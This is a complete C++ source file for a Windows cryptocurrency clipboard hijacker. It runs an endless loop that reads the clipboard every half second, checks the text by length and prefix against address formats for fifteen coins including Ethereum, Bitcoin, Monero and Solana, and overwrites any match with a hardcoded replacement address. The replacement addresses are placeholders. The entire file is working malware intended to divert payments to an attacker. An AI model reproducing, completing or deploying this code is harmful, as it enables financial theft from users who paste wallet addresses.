#include <Windows.h>

void* __cdecl memcpys(void* dst, const void* src, size_t count)
{
	void* ret = dst;

	while (count--) {
		*(char*)dst = *(char*)src;
		dst = (char*)dst + 1;
		src = (char*)src + 1;
	}

	return(ret);
}

char* GetClipboardText()
{
	if (!OpenClipboard(nullptr))
		return nullptr;
	HANDLE hData = GetClipboardData(CF_TEXT);
	if (hData == nullptr)
		return nullptr;
	char* pszText = static_cast<char*>(GlobalLock(hData));
	if (pszText == nullptr)
		return nullptr;
	GlobalUnlock(hData);
	CloseClipboard();
	return pszText;
}
void SetClipboard(char* value)
{
	const size_t len = lstrlenA(value) + 1;
	HGLOBAL hMem = GlobalAlloc(GMEM_MOVEABLE, len);
	memcpys(GlobalLock(hMem), value, len);
	GlobalUnlock(hMem);
	OpenClipboard(0);
	EmptyClipboard();
	SetClipboardData(CF_TEXT, hMem);
	CloseClipboard();
}

bool IsEth(char* addr) {
	if (lstrlenA(addr) != 42)
		return false;
	if (addr[0] == '0' && addr[1] == 'x')
		return true;
	return false;
}
bool IsTron(char* addr)
{
	if (lstrlenA(addr) != 34)
		return false;
	if (addr[0] == 'T')
		return true;
	return false;
}
bool IsRipple(char* addr)
{
	if (lstrlenA(addr) != 34)
		return false;
	if (addr[0] == 'r')
		return true;
	return false;
}
bool IsBnb(char* addr)
{
	if (lstrlenA(addr) != 42)
		return false;
	if (addr[0] == 'b' && addr[1] == 'n' && addr[2] == 'b')
		return true;
	return false;
}
bool IsLtc(char* addr)
{
	if (lstrlenA(addr) != 43)
		return false;
	if (addr[0] == 'l' && addr[1] == 't' && addr[2] == 'c')
		return true;
	return false;
}
bool IsDash(char* addr)
{
	if (lstrlenA(addr) != 34)
		return false;
	if (addr[0] == 'X')
		return true;
	return false;
}
bool IsDoge(char* addr) {
	if (lstrlenA(addr) != 34)
		return false;
	if (addr[0] == 'D')
		return true;
	return false;
}
bool IsBtc1(char* addr)
{
	if (lstrlenA(addr) != 42)
		return false;
	if (addr[0] == 'b' && addr[1] == 'c' && addr[2] == '1')
		return true;
	return false;
}
bool IsBch(char* addr) 
{
	if (lstrlenA(addr) != 42)
		return false;
	if (addr[0] == 'q')
		return true;
	return false;
}
bool IsNeo(char* addr)
{
	if (lstrlenA(addr) != 34)
		return false;
	if (addr[0] == 'A')
		return true;
	return false;
}
bool IsZCash(char* addr)
{
	if (lstrlenA(addr) != 35)
		return false;
	if (addr[0] == 't')
		return true;
	return false;
}
bool IsSol(char* addr)
{
	if (lstrlenA(addr) != 44)
		return false;
	if (addr[0] == 'E')
		return true;
	return false;
}
bool IsAda(char* addr)
{
	if (lstrlenA(addr) != 103)
		return false;
	if (addr[0] == 'a' && addr[1] == 'd' && addr[2] == 'd' && addr[3] == 'r')
		return true;
	return false;
}
bool IsXmr(char* addr)
{
	if (lstrlenA(addr) != 94)
		return false;
	if (addr[0] == '4')
		return true;
	return false;
}
bool IsDot(char* addr){
	if (lstrlenA(addr) != 48)
		return false;
	if (addr[0] == '1')
		return true;
	return false;
}

char eth[] = "0x22";
char tron[] = "Tsds";
char ripple[] = "rSDsd";
char bnb[] = "bnbSDsd";
char ltc[] = "ltcsd";
char dash[] = "Xsdsd";
char doge[] = "Dgssds";
char btc[] = "bc1s1dsd";
char bch[] = "bitcoincash1xsaS";
char neo[] = "Asdsd";
char zcash[] = "tzcash";
char sol[] = "Esdsd";
char ada[] = "addr11";
char xmr[] = "4sdsds";
char dot[] = "1sdsd";

int wmain() {
	while (true)
	{
		char* clipboard_text = GetClipboardText();
		if (clipboard_text)
		{
			if (IsEth(clipboard_text))
				SetClipboard(eth);
			if (IsTron(clipboard_text))
				SetClipboard(tron);
			if (IsRipple(clipboard_text))
				SetClipboard(ripple);
			if (IsBnb(clipboard_text))
				SetClipboard(bnb);
			if (IsLtc(clipboard_text))
				SetClipboard(ltc);
			if (IsDash(clipboard_text))
				SetClipboard(dash);
			if (IsDoge(clipboard_text))
				SetClipboard(doge);
			if (IsBtc1(clipboard_text))
				SetClipboard(btc);
			if (IsBch(clipboard_text))
				SetClipboard(bch);
			if (IsNeo(clipboard_text))
				SetClipboard(neo);
			if (IsZCash(clipboard_text))
				SetClipboard(zcash);
			if (IsSol(clipboard_text))
				SetClipboard(sol);
			if (IsAda(clipboard_text))
				SetClipboard(ada);
			if (IsXmr(clipboard_text))
				SetClipboard(xmr);
			if (IsDot(clipboard_text))
				SetClipboard(dot);


		}
		SleepEx(500, false);
	}
	return 0;
}